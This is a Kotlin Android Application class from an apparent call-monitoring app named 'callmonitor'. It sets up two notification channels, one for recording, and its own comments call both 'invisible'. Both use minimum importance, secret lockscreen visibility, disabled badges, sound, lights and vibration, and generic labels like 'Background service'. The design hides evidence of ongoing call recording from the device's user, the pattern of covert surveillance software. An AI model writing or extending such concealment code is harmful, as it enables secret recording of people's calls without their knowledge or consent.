package com.callmonitor

import android.app.Application
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import androidx.work.Configuration
import androidx.work.WorkManager

class CallMonitorApp : Application(), Configuration.Provider {

    companion object {
        const val CHANNEL_ID_RECORDING = "recording_channel"
        const val CHANNEL_ID_SERVICE = "service_channel"
        
        lateinit var instance: CallMonitorApp
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannels()
    }

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(NotificationManager::class.java)

            // Recording channel - invisible
            val recordingChannel = NotificationChannel(
                CHANNEL_ID_RECORDING,
                "Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            notificationManager.createNotificationChannel(recordingChannel)

            // Service channel - invisible
            val serviceChannel = NotificationChannel(
                CHANNEL_ID_SERVICE,
                "Background",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background process"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            notificationManager.createNotificationChannel(serviceChannel)
        }
    }

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setMinimumLoggingLevel(android.util.Log.INFO)
            .build()
}
